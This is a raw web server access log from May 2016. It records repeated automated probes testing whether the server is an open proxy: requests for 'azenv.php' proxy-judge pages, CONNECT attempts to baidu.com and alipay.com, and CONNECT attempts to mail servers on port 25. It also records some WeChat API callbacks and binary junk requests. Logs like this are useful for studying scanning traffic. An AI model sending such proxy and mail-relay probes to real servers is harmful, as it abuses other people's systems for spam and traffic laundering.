107.151.226.242 - - [27/May/2016:22:36:36 +0800] "GET http://www.rx2.eu/ivy/azenv.php HTTP/1.0" 404 2053 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [27/May/2016:22:36:37 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [27/May/2016:22:38:07 +0800] "GET http://www.proxyjudge.info/azenv.php HTTP/1.0" 404 2050 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [27/May/2016:22:38:09 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
80.82.78.38 - - [27/May/2016:22:39:16 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 2098 "-" "Mozilla"
107.151.226.242 - - [27/May/2016:23:16:18 +0800] "GET http://domkrim.com/av.php HTTP/1.0" 404 2033 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [27/May/2016:23:16:21 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [27/May/2016:23:17:11 +0800] "GET http://www.proxyjudge.info/azenv.php HTTP/1.0" 404 2050 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [27/May/2016:23:17:14 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [27/May/2016:23:46:17 +0800] "GET http://proxyjudge.us/ HTTP/1.0" 404 2017 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [27/May/2016:23:46:18 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [27/May/2016:23:47:28 +0800] "GET http://www.rx2.eu/ivy/azenv.php HTTP/1.0" 404 2053 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [27/May/2016:23:47:29 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:00:17:48 +0800] "GET http://www.proxyjudge.info/azenv.php HTTP/1.0" 404 2050 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:00:17:51 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
213.246.45.128 - - [28/May/2016:00:26:03 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 2098 "-" "Mozilla"
140.207.54.77 - - [28/May/2016:00:40:38 +0800] "POST /api.php?hash=evYqw&signature=6a5dd3eb43eda740623f72cfb0be20c49508fdfc&timestamp=1464367238&nonce=1411430749 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
140.207.54.77 - - [28/May/2016:00:40:49 +0800] "POST /api.php?hash=evYqw&signature=2763858e01ffa657d59987a6344e77b1973eead6&timestamp=1464367249&nonce=807909783 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
140.207.54.77 - - [28/May/2016:00:40:58 +0800] "POST /api.php?hash=evYqw&signature=18f88bdd920b7a7707c3daa6f16ffe45f7ca5a84&timestamp=1464367258&nonce=615479254 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
223.74.85.168 - - [28/May/2016:00:40:59 +0800] "GET /themes/mobile/default/form/form.php?id=12&type=baoyang HTTP/1.1" 404 2158 "-" "Mozilla/5.0 (Linux; Android 5.1.1; Redmi Note 3 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.2 TBS/036215 Safari/537.36 MicroMessenger/6.3.16.49_r03ae324.780 NetType/WIFI Language/zh_CN"
223.74.85.168 - - [28/May/2016:00:40:59 +0800] "GET /favicon.ico HTTP/1.1" 404 2063 "-" "Mozilla/5.0 (Linux; Android 5.1.1; Redmi Note 3 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.2 TBS/036215 Safari/537.36 MicroMessenger/6.3.16.49_r03ae324.780 NetType/WIFI Language/zh_CN"
5.178.86.78 - - [28/May/2016:00:45:38 +0800] "CONNECT check.best-proxies.ru:80 HTTP/1.1" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:00:48:00 +0800] "GET http://www.luisaranguren.com/azenv.php HTTP/1.0" 404 2052 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:00:48:01 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:00:49:09 +0800] "GET http://www.rx2.eu/ivy/azenv.php HTTP/1.0" 404 2053 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:00:49:10 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:01:06:03 +0800] "GET http://www.luisaranguren.com/azenv.php HTTP/1.0" 404 2052 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:01:06:04 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
185.25.151.159 - - [28/May/2016:01:22:46 +0800] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 2074 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
107.151.226.242 - - [28/May/2016:01:39:32 +0800] "GET http://www.luisaranguren.com/azenv.php HTTP/1.0" 404 2052 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:01:39:32 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
115.28.139.50 - - [28/May/2016:01:44:51 +0800] "CONNECT search.yahoo.com:443 HTTP/1.1" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:01:54:31 +0800] "GET http://www.rx2.eu/ivy/azenv.php HTTP/1.0" 404 2053 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:01:54:35 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:02:10:45 +0800] "GET http://domkrim.com/av.php HTTP/1.0" 404 2033 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:02:10:47 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:02:11:47 +0800] "GET http://www.rx2.eu/ivy/azenv.php HTTP/1.0" 404 2053 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:02:11:49 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:02:30:16 +0800] "GET http://www.advalleys.com/azenvaa.php HTTP/1.0" 404 2054 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:02:30:18 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
80.82.78.38 - - [28/May/2016:02:34:01 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 2098 "-" "Mozilla"
123.151.42.61 - - [28/May/2016:02:36:31 +0800] "GET http://www.baidu.com/ HTTP/1.1" 404 2029 "-" "-"
107.151.226.242 - - [28/May/2016:03:01:44 +0800] "GET http://www.proxyjudge.info/azenv.php HTTP/1.0" 404 2050 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:03:01:46 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:03:02:42 +0800] "GET http://www.advalleys.com/azenvaa.php HTTP/1.0" 404 2054 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:03:02:45 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:03:04:04 +0800] "GET http://www.proxyjudge.info/azenv.php HTTP/1.0" 404 2050 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:03:04:09 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:03:31:34 +0800] "GET http://proxyjudge.us/ HTTP/1.0" 404 2017 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:03:31:36 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:03:32:39 +0800] "GET http://www.proxy-listen.de/azenv.php HTTP/1.0" 404 2050 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:03:32:39 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:03:33:41 +0800] "GET http://www.proxy-listen.de/azenv.php HTTP/1.0" 404 2050 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:03:33:44 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
114.43.4.172 - - [28/May/2016:03:36:57 +0800] "CONNECT smtp.mail.yahoo.com:25 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:04:02:31 +0800] "GET http://www.proxy-listen.de/azenv.php HTTP/1.0" 404 2050 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:04:02:32 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:04:04:05 +0800] "GET http://domkrim.com/av.php HTTP/1.0" 404 2033 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:04:04:06 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
114.43.4.172 - - [28/May/2016:04:32:42 +0800] "CONNECT smtp.mail.yahoo.com:25 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:04:35:41 +0800] "GET http://domkrim.com/av.php HTTP/1.0" 404 2033 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:04:35:44 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
114.119.40.120 - - [28/May/2016:04:37:00 +0800] "GET http://123.125.114.238/ HTTP/1.1" 404 2031 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)"
114.43.4.172 - - [28/May/2016:05:09:54 +0800] "CONNECT smtp.mail.yahoo.com:25 HTTP/1.0" 400 172 "-" "-"
95.213.187.190 - - [28/May/2016:05:13:19 +0800] "CONNECT check.best-proxies.ru:80 HTTP/1.1" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:05:47:22 +0800] "GET http://www.advalleys.com/azenvaa.php HTTP/1.0" 404 2054 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:05:47:23 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:05:48:27 +0800] "GET http://www.rx2.eu/ivy/azenv.php HTTP/1.0" 404 2053 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:05:48:27 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
61.231.0.9 - - [28/May/2016:06:21:13 +0800] "CONNECT 163mx01.mxmail.netease.com:25 HTTP/1.0" 400 172 "-" "-"
121.42.0.33 - - [28/May/2016:06:24:45 +0800] "GET / HTTP/1.0" 404 2021 "-" "spiderman"
80.82.78.38 - - [28/May/2016:06:34:45 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 2098 "-" "Mozilla"
140.207.54.77 - - [28/May/2016:06:55:42 +0800] "POST /api.php?hash=evYqw&signature=abc20bd30b06c354b37888a58582d7a04d99bf7a&timestamp=1464389742&nonce=981692210 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
213.246.45.128 - - [28/May/2016:06:57:29 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 2098 "-" "Mozilla"
118.161.69.99 - - [28/May/2016:07:02:55 +0800] "CONNECT smtp.mail.yahoo.com:25 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:07:04:44 +0800] "GET http://www.rx2.eu/ivy/azenv.php HTTP/1.0" 404 2053 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:07:04:47 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:07:06:01 +0800] "GET http://www.luisaranguren.com/azenv.php HTTP/1.0" 404 2052 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:07:06:02 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:07:06:53 +0800] "GET http://www.proxy-listen.de/azenv.php HTTP/1.0" 404 2050 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:07:06:55 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
118.161.69.99 - - [28/May/2016:07:33:19 +0800] "CONNECT smtp.mail.yahoo.com:25 HTTP/1.0" 400 172 "-" "-"
58.247.206.144 - - [28/May/2016:07:34:27 +0800] "POST /api.php?hash=r3bbG&signature=8906005526fd40d1c9f2e9060723c34a13356368&timestamp=1464392067&nonce=626731056 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
101.106.86.139 - - [28/May/2016:07:34:28 +0800] "GET /themes/mobile/default/form/offer.php?weid=8 HTTP/1.1" 404 2145 "-" "Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.2 TBS/036215 Safari/537.36 MicroMessenger/6.3.16.49_r03ae324.780 NetType/WIFI Language/zh_CN"
101.106.86.139 - - [28/May/2016:07:34:29 +0800] "GET /favicon.ico HTTP/1.1" 404 2063 "-" "Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.2 TBS/036215 Safari/537.36 MicroMessenger/6.3.16.49_r03ae324.780 NetType/WIFI Language/zh_CN"
58.247.206.148 - - [28/May/2016:07:34:33 +0800] "POST /api.php?hash=r3bbG&signature=f74ae78f1947748767953258b1cdde3ede012652&timestamp=1464392073&nonce=1150819294 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
58.247.206.149 - - [28/May/2016:07:34:37 +0800] "POST /api.php?hash=r3bbG&signature=1f36530b7e37449440bb05f2e4d799df047af49f&timestamp=1464392077&nonce=156371434 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
101.106.86.139 - - [28/May/2016:07:34:37 +0800] "GET /themes/mobile/default/form/zsyh.php HTTP/1.1" 404 2135 "-" "Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.2 TBS/036215 Safari/537.36 MicroMessenger/6.3.16.49_r03ae324.780 NetType/WIFI Language/zh_CN"
101.106.86.139 - - [28/May/2016:07:34:37 +0800] "GET /favicon.ico HTTP/1.1" 404 2063 "-" "Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.2 TBS/036215 Safari/537.36 MicroMessenger/6.3.16.49_r03ae324.780 NetType/WIFI Language/zh_CN"
112.64.235.248 - - [28/May/2016:07:34:39 +0800] "GET /themes/mobile/default/form/zsyh.php HTTP/1.1" 404 2135 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; zh-cn; GT-I9500 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.0 QQ-URL-Manager Mobile Safari/537.36"
58.247.206.139 - - [28/May/2016:07:34:40 +0800] "POST /api.php?hash=r3bbG&signature=9c7c6cdf2146bebe61296692b783fc3765e539db&timestamp=1464392080&nonce=509753186 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
101.106.86.139 - - [28/May/2016:07:34:41 +0800] "GET /themes/mobile/default/form/appointment.php?weid=8 HTTP/1.1" 404 2163 "-" "Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.2 TBS/036215 Safari/537.36 MicroMessenger/6.3.16.49_r03ae324.780 NetType/WIFI Language/zh_CN"
101.106.86.139 - - [28/May/2016:07:34:41 +0800] "GET /favicon.ico HTTP/1.1" 404 2063 "-" "Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.2 TBS/036215 Safari/537.36 MicroMessenger/6.3.16.49_r03ae324.780 NetType/WIFI Language/zh_CN"
58.247.206.144 - - [28/May/2016:07:35:23 +0800] "POST /api.php?hash=r3bbG&signature=e082f050adf3b478761b508516e41cc9a1e053f5&timestamp=1464392123&nonce=502178114 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
121.42.0.34 - - [28/May/2016:07:37:00 +0800] "GET / HTTP/1.0" 404 2018 "-" "spiderman"
115.230.124.164 - - [28/May/2016:07:42:03 +0800] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.2150507660086916 HTTP/1.1" 404 2117 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; 360SE)"
115.239.228.3 - - [28/May/2016:07:42:44 +0800] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4027000178998164 HTTP/1.1" 404 2117 "-" "Mozilla/5.0 (compatible; MSIE 9.0; qdesk 2.4.1264.203; Windows NT 6.1; WOW64; Trident/5.0)"
115.239.228.3 - - [28/May/2016:07:42:45 +0800] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8349226106268777 HTTP/1.1" 404 2117 "-" "Mozilla/5.0 (compatible; MSIE 9.0; qdesk 2.4.1264.203; Windows NT 6.1; WOW64; Trident/5.0)"
207.46.13.8 - - [28/May/2016:07:45:50 +0800] "GET /robots.txt HTTP/1.1" 404 2063 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.8 - - [28/May/2016:07:47:53 +0800] "GET / HTTP/1.1" 404 2033 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
58.247.206.154 - - [28/May/2016:08:42:41 +0800] "POST /api.php?hash=evYqw&signature=728923261c5a0060eb511f3e4ccc4cd101e1d3e1&timestamp=1464396161&nonce=1351530108 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
222.187.25.26 - - [28/May/2016:08:46:37 +0800] "GET /wechat/ HTTP/1.1" 200 30 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
222.187.25.26 - - [28/May/2016:08:46:38 +0800] "GET /favicon.ico HTTP/1.1" 404 2063 "http://115.28.148.225/wechat/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
121.199.70.200 - - [28/May/2016:08:51:41 +0800] "GET / HTTP/1.1" 404 2033 "-" "-"
107.151.226.242 - - [28/May/2016:08:52:27 +0800] "GET http://www.advalleys.com/azenvaa.php HTTP/1.0" 404 2054 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:08:52:28 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
58.247.206.139 - - [28/May/2016:09:04:52 +0800] "POST /api.php?hash=evYqw&signature=b0096682d968b9dc2a8ce61ac3c9a07069534cdf&timestamp=1464397492&nonce=148008160 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
58.247.206.144 - - [28/May/2016:09:12:56 +0800] "POST /api.php?hash=evYqw&signature=2e97493d0099d10f8bb983d7cb595d5c7485890b&timestamp=1464397976&nonce=1430405902 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
107.151.226.242 - - [28/May/2016:09:27:47 +0800] "GET http://www.luisaranguren.com/azenv.php HTTP/1.0" 404 2052 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:09:27:49 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
183.136.190.62 - - [28/May/2016:09:29:34 +0800] "GET / HTTP/1.1" 404 2033 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
107.151.226.242 - - [28/May/2016:09:30:31 +0800] "GET http://www.advalleys.com/azenvaa.php HTTP/1.0" 404 2054 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:09:30:33 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
58.247.206.146 - - [28/May/2016:09:36:34 +0800] "POST /api.php?hash=evYqw&signature=210e378a455665708bcc3181a6f0c2321de3d9a4&timestamp=1464399394&nonce=1562150891 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
5.178.86.74 - - [28/May/2016:09:39:22 +0800] "CONNECT check.best-proxies.ru:80 HTTP/1.1" 400 172 "-" "-"
118.161.69.99 - - [28/May/2016:09:55:35 +0800] "CONNECT smtp.mail.yahoo.com:25 HTTP/1.0" 400 172 "-" "-"
140.207.54.73 - - [28/May/2016:10:00:43 +0800] "POST /api.php?hash=evYqw&signature=64b9af083cb4f3df2e93739b377cdfb7ffd1dae4&timestamp=1464400843&nonce=315934253 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
118.161.69.99 - - [28/May/2016:10:05:01 +0800] "CONNECT smtp.mail.yahoo.com:25 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:10:05:36 +0800] "GET http://domkrim.com/av.php HTTP/1.0" 404 2033 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:10:05:38 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:10:07:26 +0800] "GET http://proxyjudge.us/ HTTP/1.0" 404 2017 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:10:07:26 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
118.161.69.99 - - [28/May/2016:10:11:52 +0800] "CONNECT smtp.mail.yahoo.com:25 HTTP/1.0" 400 172 "-" "-"
58.247.206.149 - - [28/May/2016:10:14:54 +0800] "POST /api.php?hash=evYqw&signature=6ec0d8d77385ebc76d910801d9f8d61261b4218d&timestamp=1464401694&nonce=1677641990 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
58.247.206.139 - - [28/May/2016:10:32:40 +0800] "POST /api.php?hash=evYqw&signature=edbb1499f83e54c055fd43809575d811e967f12c&timestamp=1464402760&nonce=2046121951 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
80.82.78.38 - - [28/May/2016:10:40:12 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 2098 "-" "Mozilla"
121.42.0.88 - - [28/May/2016:10:40:15 +0800] "\x00\x9C\x00\x01\x1A+<M\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x001\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 172 "-" "-"
121.42.0.88 - - [28/May/2016:10:40:22 +0800] "\x00\x0E8\xC5;.\x5CC\xE3W\xCD\x00\x00\x00\x00\x00" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:10:44:33 +0800] "GET http://www.proxy-listen.de/azenv.php HTTP/1.0" 404 2050 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:10:44:35 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:10:45:26 +0800] "GET http://www.luisaranguren.com/azenv.php HTTP/1.0" 404 2052 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:10:45:27 +0800] "CONNECT www.alipay.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:10:46:38 +0800] "GET http://www.proxy-listen.de/azenv.php HTTP/1.0" 404 2050 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:10:46:40 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
121.33.250.228 - - [28/May/2016:11:12:45 +0800] "GET /favicon.ico HTTP/1.1" 404 2063 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; 360space)"
118.161.69.99 - - [28/May/2016:11:13:49 +0800] "CONNECT smtp.mail.yahoo.com:25 HTTP/1.0" 400 172 "-" "-"
58.247.206.157 - - [28/May/2016:11:21:48 +0800] "POST /api.php?hash=evYqw&signature=eec739dec0efe8a73ddce7f15bcf5c822160338c&timestamp=1464405708&nonce=370856942 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
107.151.226.242 - - [28/May/2016:11:22:13 +0800] "GET http://www.proxy-listen.de/azenv.php HTTP/1.0" 404 2050 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:11:22:15 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
107.151.226.242 - - [28/May/2016:11:23:06 +0800] "GET http://proxyjudge.us/ HTTP/1.0" 404 2017 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
107.151.226.242 - - [28/May/2016:11:23:08 +0800] "CONNECT www.baidu.com:443 HTTP/1.0" 400 172 "-" "-"
140.207.54.77 - - [28/May/2016:11:25:00 +0800] "POST /api.php?hash=evYqw&signature=0cb1e208d2217df9e113f136aaf9c5d6b498d907&timestamp=1464405900&nonce=1483275962 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
140.207.54.77 - - [28/May/2016:11:25:09 +0800] "POST /api.php?hash=evYqw&signature=d8b841c66618bb8c5af6565bbc822114e369614f&timestamp=1464405909&nonce=889843562 HTTP/1.0" 404 2151 "-" "Mozilla/4.0"
140.207.54.77 - - [28/May/2016:11:26:08 +0800] "POST /api.php?hash=evYqw&signature=6e54fb8bcd4297ce7a8fd47c113a7b4a856cf5e3&timestamp=1464405968&nonce=2057147461 HTTP/1.0" 404 2152 "-" "Mozilla/4.0"
